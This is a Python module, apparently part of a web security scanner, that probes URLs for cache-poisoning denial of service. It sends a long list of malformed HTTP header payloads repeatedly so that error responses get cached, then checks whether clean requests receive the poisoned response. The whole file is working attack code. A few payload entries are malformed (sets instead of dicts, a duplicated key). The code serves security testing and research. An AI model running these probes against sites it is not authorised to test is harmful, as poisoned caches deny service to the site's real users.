#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Attempts to find Cache Poisoning Denial of Service (CpDoS) error based
https://cpdos.org/
"""

from ..utils import *


def check_cached_status(url, s, pk, main_status_code, authent):
    behavior = False
    confirmed = False
    cache_status = False

    try:
        for i in range(0, 20):
            req = s.get(url, headers=pk, verify=False, allow_redirects=False, auth=authent, timeout=10)
        req_verify = s.get(url, verify=False, allow_redirects=False, auth=authent, timeout=10)
        #print(f"{req.status_code} :: {req_verify.status_code}")
        if req.status_code == req_verify.status_code and req.status_code not in [429, 200, 304, 303] and req_verify.status_code != main_status_code:
            behavior = True
            for rh in req_verify.headers:
                if "age" in rh.lower() or "hit" in req_verify.headers[rh].lower():
                    confirmed = True
                    cache_status = True
        elif req.status_code != req_verify.status_code and req.status_code == 304:
            for rh in req_verify.headers:
                if "age" in rh.lower() or "hit" in req_verify.headers[rh].lower():
                    confirmed = True
                    cache_status = True
        elif req.status_code != req_verify.status_code and req.status_code not in [429, 304]:
            for rh in req_verify.headers:
                if "age" in rh.lower() or "hit" in req_verify.headers[rh].lower():
                    behavior = True
                    cache_status = True

        if confirmed:
            print(f"\033[31m └── [VULNERABILITY CONFIRMED]\033[0m | CPDoSError {main_status_code} > {req.status_code} | CACHE : {cache_status} | \033[34m{url}\033[0m | PAYLOAD: {pk}")
            behavior = False
            confirmed = False
        elif behavior:
            print(f"\033[33m └── [INTERESTING BEHAVIOR]\033[0m | CPDoSError {main_status_code} > {req.status_code} | CACHE : {cache_status} | \033[34m{url}\033[0m | PAYLOAD: {pk}")
    except Exception as e:
        #print(f"Error : {e}")
        pass


def check_cached_len(url, s, pk, main_len, authent):
    behavior = False
    confirmed = False
    cache_status = False

    try:
        for i in range(0, 20):
            req = s.get(url, headers=pk, verify=False, allow_redirects=False, auth=authent, timeout=10)
        req_verify = s.get(url, verify=False, allow_redirects=False, auth=authent, timeout=10)
        #print(f"{req.status_code} :: {req_verify.status_code}")
        if len(req.content) == len(req_verify.content) and len(req_verify.content) != main_len:
            behavior = True
            for rh in req_verify.headers:
                if "age" in rh.lower() or "hit" in req_verify.headers[rh].lower():
                    confirmed = True
                    cache_status = True
        elif len(req.content) != len(req_verify.content):
            for rh in req_verify.headers:
                if "age" in rh.lower():
                    behavior = True
                    cache_status = True
                else:
                    behavior = True
                    cache_status = False

        if confirmed:
            print(f"\033[31m └── [VULNERABILITY CONFIRMED]\033[0m | CPDoSError {main_len}b > {len(req.content)}b | CACHE : {cache_status} | \033[34m{url}\033[0m | PAYLOAD: {pk}")
            behavior = False
        elif behavior:
            print(f"\033[33m └── [INTERESTING BEHAVIOR]\033[0m | CPDoSError {main_len}b > {len(req.content)}b | CACHE : {cache_status} | \033[34m{url}\033[0m | PAYLOAD: {pk}")
    except Exception as e:
        #print(f"Error : {e}")
        pass

def get_error(url, s, main_status_code, main_len, authent):

    payload_keys = [
    {"xyz": "1"},
    {"(": "1"},
    {"/": "\\:\\"},
    {'"': "1"}, 
    {"\\":"1"},
    {"x-timer": "x"*500},
    {"X-Timer": "5000"},
    {"X-Requested-With": "SomeValue"},
    {"Authorization": "Bearer InvalidToken"},
    {"Accept": "toto"},
    {"Accept-Encoding": "toto"},
    {"Accept-Encoding": "gzip;q=1.0, identity;q=0.5, *;q=0"},
    {"Expect": "100-continue"},
    {"If-None-Match": "etag123"},
    {"If-None-Match": "*", "If-Match": "toto"},
    {"If-None-Match": "<toto>"},
    {"If-Match": "etag-value"},
    {"Max-Forwards": "0"},
    {"Max-Forwards": "foo"},
    {"TE": "toto"},
    {"Connection": "toto"},
    {"Content-Encoding": "deflate"},
    {"Upgrade": "toto"},
    {"Proxy-Authorization": "Basic dXNlcjpwYXNzd29yZA=="},
    {"Proxy-Authenticate": "Basic realm=xxxx"},
    {"Via": "1.1 proxy.example.com"},
    {"DNT": "1"},
    {"Content-Disposition": "invalid_value"},
    {"Warning": "199 - Invalid Warning"},
    {"Trailer": "invalid_header"},
    {"Referer": "xy"},
    {"Referer": "xy", "Referer": "x"},
    {"Content-Length":"394616521189"},
    {"Content-Length": "-1"},
    {"Transfer-Encoding": "chunked"},
    {"Transfer-Encoding": "compress"},
    {"Transfer-Encoding": "gzip, chunked"},
    {"Content-Type": "application/invalid-type"},
    {"Retry-After":"-1"},
    {"Retry-After":"foo"},
    {"Retry-After":"1200"},
    {"X-RateLimit-Limit": "1000"},
    {"X-RateLimit-Remaining": "500"},
    {"X-RateLimit-Reset": "1581382800"},
    {"X-Requested-With": "foo"},
    {"X-Content-Type-Options": "foo"},
    {"TE": "teapot"},
    {"TE": "foo"},
    {"X-CF-APP-INSTANCE": "xxx:1"},
    {"X-CF-APP-INSTANCE":"aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa:1"},
    {"X_FORWARDED_PROTO", "nohhtps"},
    {"Cache-Control": "no-cache"},
    {"If-Modified-Since": "Wed, 21 Oct 2015 07:28:00 GMT"},
    {"Accept-Language": "xx"},
    {"Origin": "https://unauthorized-origin.com"},
    {"From": "user@example.com"},
    {"Pragme": "toto"},
    {"Accept-Charset": "Accept-Charset: utf-8, iso-8859-1;q=0.5"},
    {"DPR": "2.0"},
    {"Save-Data": "on"},
    {"Sec-Fetch-Mode": "toto"},
    {"Sec-Fetch-Site": "toto"},
    {"Sec-Fetch-User": "toto"},
    {"Timing-Allow-Origin": "*"},
    {"Content-DPR": "1.0"},
    {"Early-Data": "1"},
    {"NEL": "toto"},
    {"Reporting-Endpoints": "toto"},
    {"Feature-Policy", "camera 'none'; microphone 'none'"},
    {"Clear-Site-Dat": "cache"},
    {"Expect-CT": "max-age=604800, enforce"},
    {"Access-Control-Request-Method": "POST"},
    {"Access-Control-Request-Headers": "X-Custom-Header"},
    {"Upgrade-Insecure-Requests": "1"},
    {"Front-End-Https": "toto"},
    {"Surrogate-Control": "no-store"},
    {"X-Robots-Tag": "noindex"},
    {"Service-Worker-Allowed": "/"},
    {"Cross-Origin-Embedder-Policy": "require-corp"},
    {"Cross-Origin-Opener-Policy": "same-origin"},
    {"Cross-Origin-Resource-Policy": "same-origin"},
    {"Server-Timing": "miss, db;dur=53, app;dur=47.2"},
    {"x-invoke-status": "888"},
    {"x-invoke-status": "404"},
    {"x-invoke-status": "xxx"},
    {"Rsc": "1"},
    {"Rsc": "xxx"},
    {"x-middleware-prefetch": "1"},
    {"Content-Encoding": "toto"},
    {"Content-Type": "text/html; charset=utf-16"},
    {"Content-Type": "text/html; charset=utf-32"},
    {"Content-Type": "text/html; charset=invalid-charset"},
    {"Content-Type": "text/html; charset=invalid-charset", "Content-Encoding": "toto"},
    {"Content-Type": "application/json", "Content-Encoding": "gzip"},
    {"Content-Type": "application/octet-stream", "Content-Encoding": "deflate"},
    {"Content-Encoding": "gzip, deflate"},
    {"Content-Language": "xxxx"},
    {"Content-Location": "xxxx"},
    {"Content-MD5 ; xxxx"},
    {"Content-Security-Policy": "xxxx"},
    {"Content-Security-Policy": "default-src 'self'; img-src 'self' data:"},
    {"Content-Features": "foo=xxxx"},
    {"Content-Base": "xxxx"},
    {"Content-Transfer-Encoding": "xxxx"},
    {"Content-Style-Type": "xxxx"},
    {"Content-Script-Type": "xxxx"},
    {"Content-Label": "xxxx"},
    {"Content-Warning": "xxxx"},
    {"Content-Rate": "xxxx"},
    {"Content-Digest": "xxxx"},
    {"xxxx":"缓"},
    {"缓":"缓"},
    {"X-Custom-Header-♥": "value"},
    {"X-Custom-Header-@": "value"},
    {"X-Custom-Header": "``"},
    {"Range": "bytes=nobytes"},
    {"Range": "bytes=-10"},
    {"Range": "bytes=200-300,100-150"},
    {"Range": "bytes=0-50,100-150"},
    {"Range": "Range: bytes=10000000-200000000"},
    {"Range": "bytes=500-400"},
    {"Range": "bytes=7000-"},
    {'Next-Router-State-Tree': '{"path":"/xxxx","params":{"id":"123"} }'},
    {'Next-Router-Prefetch': 'maybe'},
    {'Next-Url': '!@#$%^&*()'},
    {"CF-Connecting-IP": "999.999.999.999"},
    {"Fastly-FF": "enable_inexistent_feature"},
    {"X-Accel-Redirect": "/invalid/path/to/resource"},
    {"X-Akamai-Edge-Cache": "wrong-value"},
    {"CF-Visitor": '{"scheme":http}'},
    {"Surrogate-Control": "invalid-directive"},
    {"X-Real-IP": "abc.def.ghi.jkl"},
    {"X-Akamai-Request-ID": "some-invalid-id"},
    {"CF-IPCountry": "XYZ"},
    {"Fastly-Client-IP": "1234.567.89.0"},
    {"X-Accel-Expires": "invalid-time"},
    ]

    blocked = 0
    for pk in payload_keys:
        uri = f"{url}{random.randrange(999)}"
        try:
            req = s.get(uri, headers=pk, verify=False, auth=authent, timeout=10, allow_redirects=False)
            len_req = len(req.content)

            if req.status_code == 888:
                print(f"\033[33m └── [INTERESTING BEHAVIOR]\033[0m | CPDoSError 888 response | CACHE: N/A | \033[34m{url}\033[0m | PAYLOAD: {pk}")
                check_cached_status(uri, s, pk, main_status_code, authent)
            elif req.status_code == 403 or req.status_code == 429:
                uri_403 = f"{url}{random.randrange(999)}"
                req_403_test = requests.get(uri_403, verify=False, auth=authent, timeout=10, allow_redirects=False)
                if req_403_test.status_code == 403 or req_403_test.status_code == 429:
                    blocked += 1

            elif blocked < 3 and req.status_code != 200 and main_status_code not in [403, 401] and req.status_code != main_status_code:
                #print(f"[{main_status_code}>{req.status_code}] [{len(main_status_code.headers)}b>{len(req.headers)}b] [{len(main_status_code.content)}b>{len(req.content)}b] {url} :: {pk}")
                check_cached_status(uri, s, pk, main_status_code, authent)
            elif blocked < 3 and req.status_code == 200:
                if len(str(main_len)) <= 5 and main_len not in range(len_req - 1000, len_req + 1000):
                    check_cached_len(uri, s, pk, main_len, authent)
                elif len(str(main_len)) > 5 and main_len not in range(len_req - 10000, len_req + 10000):
                    check_cached_len(uri, s, pk, main_len, authent)
        except requests.Timeout:
            #print(f"request timeout {url} {p}")
            pass
        except KeyboardInterrupt:
            print("Exiting")
            sys.exit()
        except Exception as e:
            #print(f"Error : {e}")
            pass
        uri = url


if __name__ == '__main__':
    url_file = sys.argv[1]
    s = requests.Session()
    s.headers.update({'User-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko'})
    #get_error(url_file, s)
    with open(url_file, "r") as urls:
        urls = urls.read().splitlines()
        for url in urls:
            url = f"{url}?cb="
            try:
                req_main = s.get(url, verify=False, timeout=10, allow_redirects=False)
                main_len = len(req_main.content)
                main_status_code = req_main.status_code
                authent = False
                get_error(url, s, main_status_code, main_len, authent)
            except KeyboardInterrupt:
                print("Exiting")
                sys.exit()
            except:
                pass
            print(f" {url}", end='\r')